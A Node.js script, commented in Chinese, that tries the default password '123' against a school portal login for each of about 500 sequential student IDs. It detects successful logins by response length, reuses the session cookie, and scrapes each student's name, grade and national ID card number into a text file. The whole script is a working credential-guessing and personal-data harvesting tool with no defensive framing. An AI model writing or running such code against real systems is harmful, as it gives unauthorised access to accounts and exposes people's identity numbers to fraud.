var express = require('express');
var superagent = require('superagent');
var cheerio = require('cheerio');
var fs = require('fs');


function getInfor(_num){
	var studentID = _num;
	var get_req = superagent.post('http://xxx.com').set('Content-Type','application/x-www-form-urlencoded').set('Access-Control-Allow-Origin','*').accept('application/json').send({
	__VIEWSTATE:'/wEPDwUJLTY4NDQ4MzYyZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUMSW1hZ2VCdXR0b24xV9Pz0r45bARFKW/DYVwAtIOIjZTDqywD0s+b1PK5AEE=',
	__EVENTVALIDATION:'/wEdAAkfWcVmlKYxLh//tSU0Fyxrwq7Fr2euId72M7tGGVWWmjcB0ByOc3lD017dG+u9BrHpkAKvHlFmeWUpJ6tT4i4q3AAkWX6zYhvSPTmzJ9kqznESVQr6muXA0GC5J72tPjJpiQ8hpL+75B2xTt54sPFlg0+atK5dzWd7wF0hGyiCAZYQJk9BEu6uNMVVQ9NYQ1ZGiB+QpKBZL/yebAX6latO19hoxnmlzyXzgxA2CWE7Mw==',
	TxtUserName:studentID,
	TxtUserPwd:123,
	'ImageButton1.x':25,
	'ImageButton1.y':7,
	RadioButtonList1:'本科生'}).redirects(0).end(function(err,result){
			//用户名存在且登陆成功的返回Header中，content-length长度为136
			//登陆失败则为3542，可以根据此做登陆验证
			//因为本身是异步机制，所以1000层的递归不会导致内存问题
			if( result == undefined || result.headers['content-length'] > 150){
				if(_num > end_number){
					return false;
				}
				getInfor(++_num);
				return false;
			}
			var cookie_temp = result.headers['set-cookie'];
			var cookie = cookie_temp[0].split(';')[0];
			superagent.get('http://xxx.com').set('Cookie',cookie).end(
				function(err,str){
					if(str == undefined || str == null){
						return false;
					}
					var $ = cheerio.load(str.text);
					var stu = {};
					stu.name = $('#lblName').text();
					stu.number =  $('#lblSerial').text();
					stu.grade =  $('#lblGrade').text();
					stu.card =  $('#lblIDNumber').text();

					total_num++;
					var _t = stu.number+","+stu.grade+","+stu.name+","+stu.card+"\n\r";
					fs.appendFile(FILE_NAME,_t,function(err){
						//console.log(err);
					});

					if(_num > end_number){
						return false;
					}
					getInfor(++_num);
					return false;
				}
			);
		});
};



var error_times = 0;
var total_num = 0;					//总数
var FILE_NAME = '2012.txt';			//写入文件名
var start_number = 201294001;		//初始id
var end_number = 201294500;			//结束id

getInfor(start_number);
